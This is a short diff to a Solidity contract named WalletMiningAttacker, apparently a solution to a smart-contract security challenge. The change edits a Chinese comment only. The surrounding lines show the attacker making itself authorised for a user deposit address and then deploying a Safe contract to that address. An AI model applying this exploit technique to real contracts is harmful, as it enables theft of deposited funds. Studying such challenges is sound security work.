@@ -315,7 +315,7 @@ contract WalletMiningAttacker {
         _wards[0] = attack;
         _aims[0] = USER_DEPOSIT_ADDRESS;
         
-        // 重置授权，获取目标地址部署权限
+        // 批量添加授权条目，获取目标地址部署权限
         authorizer.init(_wards, _aims);
         // 精准部署 Safe 合约至目标资产地址
         walletDeployer.drop(USER_DEPOSIT_ADDRESS, wat, salt);
